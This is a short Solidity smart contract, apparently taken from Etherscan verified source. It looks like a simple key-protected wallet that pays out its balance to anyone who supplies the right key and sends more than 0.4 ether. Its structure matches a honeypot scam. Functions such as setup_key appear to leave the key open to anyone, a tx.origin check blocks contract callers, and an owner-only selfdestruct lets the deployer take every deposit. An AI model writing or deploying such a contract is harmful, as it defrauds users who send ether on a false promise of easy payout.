/**
 * Source Code first verified at https://etherscan.io on Monday, April 29, 2019
 (UTC) */

pragma solidity ^0.4.25;

contract mutil_funds
{
    bytes32 keyHash;
    address owner;
    bytes32 wallet_id = 0x6f9a91ce11d7af59450e17d3ca77326c3f4af79f3ac61df8cc420e8679d990f8;

    constructor() public {
        owner = msg.sender;
    }

    function withdraw(string key) public payable
    {
        require(msg.sender == tx.origin);
        if(keyHash == keccak256(abi.encodePacked(key))) {
            if(msg.value > 0.4 ether) {
                msg.sender.transfer(address(this).balance);
            }
        }
    }

    function setup_key(string key) public
    {
        if (keyHash == 0x0) {
            keyHash = keccak256(abi.encodePacked(key));
        }
    }

    function chagne_hash(bytes32 new_hash) public
    {
        if (keyHash == 0x0) {
            keyHash = new_hash;
        }
    }

    function clear() public
    {
        require(msg.sender == owner);
        selfdestruct(owner);
    }

    function get_id() public view returns(bytes32){
        return wallet_id;
    }

    function () public payable {
    }
}